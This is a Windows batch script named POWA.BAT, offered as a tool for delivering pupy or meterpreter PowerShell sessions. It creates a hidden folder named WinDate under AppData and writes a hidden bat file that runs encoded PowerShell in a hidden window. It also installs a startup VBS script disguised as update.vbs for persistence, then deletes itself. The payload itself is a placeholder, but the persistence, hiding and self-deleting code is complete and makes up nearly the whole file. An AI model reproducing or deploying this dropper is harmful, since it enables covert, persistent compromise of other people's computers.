REM #POWA.BAT#
REM #A batch file to assist with delivery of pupy or meterpreter reflective dll powershell sessions#
REM #Replace XXXXXXXXXXX with your own powershell code


:BatMenu
cls
echo.
echo  ______ _______ ________ _______    ______ _______ _______ 
echo |   __ \       |  |  |  |   _   |  |   __ \   _   |_     _|
echo |    __/   -   |  |  |  |       |__|   __ <       | |   |  
echo |___|  |_______|________|___|___|__|______/___|___| |___|    
echo.
echo Ver 0.1
echo inf0sec@tuta.io
echo.
ECHO.
ECHO echo POWA.BAT MENU
ECHO.
ECHO 1. Unleash the hounds! - Install with persistence and then melt
ECHO 2. Twinkle, Twinkle, little bat - No persistence, no melting 
ECHO 3. Bat out of Hell - Uninstall POWA.BAT
ECHO 4. I need help! - Yes you do
ECHO 5. Rage Quit - Exit this awesome menu and go back to CMD
Echo.

set choice=
set /p choice=Choose how you want your bat to fly.
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='1' goto BatStall
if '%choice%'=='2' goto BatRun
if '%choice%'=='3' goto BatRem
if '%choice%'=='4' goto BatHelp
if '%choice%'=='5' goto RageQuit
ECHO "%choice%" wtf, try again
ECHO.
goto BatMenu



:BatStall
REM First does a check to see if my directory is created, if not, creates it
if exist "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\WinDate" goto DirExists
mkdir  "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\WinDate"
attrib +h "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\WinDate"

:DirExists
REM Does a check to see if my bat file exists, if not, creates it. 

if exist "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\WinDate\powa.bat" goto FileExists
echo powershell.exe -w hidden -noni -nop -enc XXXXXXXXXXXXXXXXXX 1> "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\WinDate\powa.bat"
attrib +h "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\WinDate\powa.bat"

:FileExists
REM Has a look to see if the vbs script that runs at startup and hides the powershell window is setup, if not, sets it up

if exist "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.vbs" goto BatStart

REM This bit created the vbs script to hide the POWA.BAT command.

ECHO Set WshShell = CreateObject("WScript.Shell")>>"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.vbs"
ECHO WshShell^.Run chr^(34^) ^& "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\WinDate\powa.bat" ^& Chr^(34^)^,^ ^0>>"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.vbs"
ECHO Set WshShell = Nothing>>"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.vbs"

REM I didnt want 10000 spawns of powershell so this does a check to see if there is a powershell session running
REM If no powershell sessesion, it runs my command, if a powershell session, bat file exits

:BatStart
tasklist /FI "IMAGENAME eq powershell.exe" 2>NUL | find /I /N "powershell.exe">NUL
if "%ERRORLEVEL%"=="0" goto KamaKazi
powershell.exe -w hidden -noni -nop -enc XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

:KamaKazi
CLS
(goto) 2>nul & del "%~f0"

:BatRun
tasklist /FI "IMAGENAME eq powershell.exe" 2>NUL | find /I /N "powershell.exe">NUL
if "%ERRORLEVEL%"=="0" goto RageQuit
powershell.exe -w hidden -noni -nop -enc XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

:BatRem

if exist "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\WinDate\powa.bat" goto RemDel
ECHO The little shit is not installed here, so all good
PAUSE
CLS
GOTO BatMenu

:RemDel
DEL "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\WinDate\powa.bat"
RMDIR "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\WinDate"
DEL "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.vbs"




:RageQuit
CLS
EXIT

